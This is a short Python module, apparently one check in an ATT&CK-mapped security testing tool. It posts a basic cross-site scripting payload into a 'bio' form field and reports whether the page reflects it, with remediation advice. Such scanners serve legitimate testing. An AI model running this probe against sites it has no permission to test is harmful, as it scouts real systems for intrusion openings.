import requests
from backend.utility_f import log

def run(target_url):
    payload = "<script>alert('XSS')</script>"

    try:
        response = requests.post(target_url, data={
            "bio": payload,
            "submit": "Update"
        })

        if payload in response.text:
            log(" Reflected or stored XSS vulnerability detected!", level="success")
            return {
                "stage": "Execution",
                "technique_id": "T1059.007",
                "technique_name": "JavaScript Execution via XSS",
                "success": True,
                "details": "XSS payload reflected or stored in page output.",
                "remediation": "Sanitize and encode all user input before rendering."
            }

    except Exception as e:
        return {
            "stage": "Execution",
            "technique_id": "T1059.007",
            "technique_name": "JavaScript Execution via XSS",
            "success": False,
            "details": f"Error during request: {e}",
            "remediation": "Check input sanitization and response output handling."
        }

    return {
        "stage": "Execution",
        "technique_id": "T1059.007",
        "technique_name": "JavaScript Execution via XSS",
        "success": False,
        "details": "XSS payload not reflected in response.",
        "remediation": "Sanitize inputs and use context-aware escaping."
    }
